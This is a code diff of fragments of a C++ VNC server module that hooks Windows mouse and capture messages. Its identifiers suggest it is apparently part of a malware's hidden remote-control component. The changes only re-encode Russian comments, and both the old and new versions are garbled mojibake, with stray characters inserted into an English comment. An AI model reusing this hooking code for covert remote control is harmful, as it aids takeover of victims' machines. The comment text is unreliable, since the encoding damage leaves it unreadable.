@@ -14,16 +14,16 @@
 #if(BO_VNC > 0)
 
 /*
-  Èçìåíåíèå çàõâà÷åíîãî îêíà.
+  Ð˜Ð·Ð¼ÐµÐ½ÐµÐ½Ð¸Ðµ Ð·Ð°Ñ…Ð²Ð°Ñ‡ÐµÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð°.
 
   IN OUT vncProcessData - VNCPROCESSDATA.
-  IN newTid             - íîâûé TID.
-  IN newWindow          - íîâîå îêíî.
-  IN newArea            - îáëàñòü çàõâàòà.
-  IN post               - true - âûñûëàòü WM_CAPTURECHANGED ÷åðåç PostMessage.
-                          false - âûñûëàòü WM_CAPTURECHANGED ÷åðåç SendMessage.
+  IN newTid             - Ð½Ð¾Ð²Ñ‹Ð¹ TID.
+  IN newWindow          - Ð½Ð¾Ð²Ð¾Ðµ Ð¾ÐºÐ½Ð¾.
+  IN newArea            - Ð¾Ð±Ð»Ð°ÑÑ‚ÑŒ Ð·Ð°Ñ…Ð²Ð°Ñ‚Ð°.
+  IN post               - true - Ð²Ñ‹ÑÑ‹Ð»Ð°Ñ‚ÑŒ WM_CAPTURECHANGED Ñ‡ÐµÑ€ÐµÐ· PostMessage.
+                          false - Ð²Ñ‹ÑÑ‹Ð»Ð°Ñ‚ÑŒ WM_CAPTURECHANGED Ñ‡ÐµÑ€ÐµÐ· SendMessage.
   
-  Return                - ïðåäûäóùèòå çàõâà÷åíîå îêíî.
+  Return                - Ð¿Ñ€ÐµÐ´Ñ‹Ð´ÑƒÑ‰Ð¸Ñ‚Ðµ Ð·Ð°Ñ…Ð²Ð°Ñ‡ÐµÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾.
 */
 static HWND changeMouseCapture(VNCPROCESSDATA *vncProcessData, DWORD newTid, HWND newWindow, WORD newArea, bool post)
 {
@@ -45,7 +45,7 @@ static HWND changeMouseCapture(VNCPROCESSDATA *vncProcessData, DWORD newTid, HWN
 }
 
 /*
-  Ïåðåìåùåíèå òåêóùåãî çàõâà÷åíîãî îêíà.
+  ÐŸÐµÑ€ÐµÐ¼ÐµÑ‰ÐµÐ½Ð¸Ðµ Ñ‚ÐµÐºÑƒÑ‰ÐµÐ³Ð¾ Ð·Ð°Ñ…Ð²Ð°Ñ‡ÐµÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð°.
 
   IN OUT vncProcessData - VNCPROCESSDATA.
   IN x                  - X.
@@ -118,13 +118,13 @@ static void moveCapturedWindow(VNCPROCESSDATA *vncProcessData, LONG x, LONG y)
 }
 
 /*
-  Ïðîâåðÿò ñîîáùåíèå íà äàáëêëèê.
+  ÐŸÑ€Ð¾Ð²ÐµÑ€ÑÑ‚ ÑÐ¾Ð¾Ð±Ñ‰ÐµÐ½Ð¸Ðµ Ð½Ð° Ð´Ð°Ð±Ð»ÐºÐ»Ð¸Ðº.
 
   IN OUT vncProcessData - VNCPROCESSDATA.
-  IN window             - îêíî.
-  IN message            - èñõîäíîå ñîîáùåíèå.
+  IN window             - Ð¾ÐºÐ½Ð¾.
+  IN message            - Ð¸ÑÑ…Ð¾Ð´Ð½Ð¾Ðµ ÑÐ¾Ð¾Ð±Ñ‰ÐµÐ½Ð¸Ðµ.
 
-  Return                - îðèãèàíëüíûé message, èëè åãî äàáëêëèê.
+  Return                - Ð¾Ñ€Ð¸Ð³Ð¸Ð°Ð½Ð»ÑŒÐ½Ñ‹Ð¹ message, Ð¸Ð»Ð¸ ÐµÐ³Ð¾ Ð´Ð°Ð±Ð»ÐºÐ»Ð¸Ðº.
 */
 static DWORD checkForDoubleClick(VNCPROCESSDATA *vncProcessData, HWND window, DWORD message)
 {
@@ -191,16 +191,16 @@ static DWORD checkForDoubleClick(VNCPROCESSDATA *vncProcessData, HWND window, DW
 }
 
 /*
-  Îáðàáîòêà ñîáûòèÿ ìûøè.
+  ÐžÐ±Ñ€Ð°Ð±Ð¾Ñ‚ÐºÐ° ÑÐ¾Ð±Ñ‹Ñ‚Ð¸Ñ Ð¼Ñ‹ÑˆÐ¸.
 
   IN vncProcessData  - VNCPROCESSDATA.
-  IN window          - îêíî.
-  IN windowInfo      - äàííûå îá îêíå.
-  IN hiTest          - ðåçóëüòàò WM_NCHITTEST.
-  IN message         - ñîîáùåíèå äëÿ HTCLIENT.
-  IN ncMessage       - ñîîáùåíèå íå äëÿ HTCLIENT.
-  IN clientCursorPos - êëèåíòñêèå êîîðäèíàòû.
-  IN screenCursorPos - ýêàðííûå êîîðäèíàòû.
+  IN window          - Ð¾ÐºÐ½Ð¾.
+  IN windowInfo      - Ð´Ð°Ð½Ð½Ñ‹Ðµ Ð¾Ð± Ð¾ÐºÐ½Ðµ.
+  IN hiTest          - Ñ€ÐµÐ·ÑƒÐ»ÑŒÑ‚Ð°Ñ‚ WM_NCHITTEST.
+  IN message         - ÑÐ¾Ð¾Ð±Ñ‰ÐµÐ½Ð¸Ðµ Ð´Ð»Ñ HTCLIENT.
+  IN ncMessage       - ÑÐ¾Ð¾Ð±Ñ‰ÐµÐ½Ð¸Ðµ Ð½Ðµ Ð´Ð»Ñ HTCLIENT.
+  IN clientCursorPos - ÐºÐ»Ð¸ÐµÐ½Ñ‚ÑÐºÐ¸Ðµ ÐºÐ¾Ð¾Ñ€Ð´Ð¸Ð½Ð°Ñ‚Ñ‹.
+  IN screenCursorPos - ÑÐºÐ°Ñ€Ð½Ð½Ñ‹Ðµ ÐºÐ¾Ð¾Ñ€Ð´Ð¸Ð½Ð°Ñ‚Ñ‹.
 */
 static void mouseEvent(VNCPROCESSDATA *vncProcessData, HWND window, const WINDOWINFO *windowInfo, WORD hitTest, DWORD message, DWORD ncMessage, LPARAM clientCursorPos, LPARAM screenCursorPos)
 {
@@ -389,8 +389,8 @@ void mouseMessage(VNCPROCESSDATA *vncProcessData, DWORD flags, LONG x, LONG y, D
   HWND window = Gui::_windowFromPoint(vncProcessData->globalData->cursorPoint, SENDMESSAGE_TIMEOUT, &hitTest);
   
   /*
-    Åñëè îêíî âåðíóëî HITTEST èçìåííèÿ ðàçìåðà, à áîðäþðà ó îêíà íåò,
-    ïåðåíåíàïðàâëÿåì äàííûå ðîäèòåëþ.
+    Ð•ÑÐ»Ð¸ Ð¾ÐºÐ½Ð¾ Ð²ÐµÑ€Ð½ÑƒÐ»Ð¾ HITTEST Ð¸Ð·Ð¼ÐµÐ½Ð½Ð¸Ñ Ñ€Ð°Ð·Ð¼ÐµÑ€Ð°, Ð° Ð±Ð¾Ñ€Ð´ÑŽÑ€Ð° Ñƒ Ð¾ÐºÐ½Ð° Ð½ÐµÑ‚,
+    Ð¿ÐµÑ€ÐµÐ½ÐµÐ½Ð°Ð¿Ñ€Ð°Ð²Ð»ÑÐµÐ¼ Ð´Ð°Ð½Ð½Ñ‹Ðµ Ñ€Ð¾Ð´Ð¸Ñ‚ÐµÐ»ÑŽ.
   */
   if(hitTest >= HTSIZEFIRST && hitTest <= HTSIZELAST)
   {
@@ -565,10 +565,10 @@ HWND WINAPI VncServer::hookerGetCapture(void)
   return CWA(user32, GetCapture)();
 }
 
-/*Â Â Modification of the MSG structure.
+/*Ð’Â Ð’Â Modification of the MSG structure.
 
-Â Â IN r - returns a value from a function to obtain a structure msg.
-Â Â IN OUT msg - MSG*/
+Ð’Â Ð’Â IN r - returns a value from a function to obtain a structure msg.
+Ð’Â Ð’Â IN OUT msg - MSG*/
 static void fixMessage(BOOL r, LPMSG msg)
 {
   if(r != 0 && r != -1 && msg != NULL && IS_VNC_PROCESS)
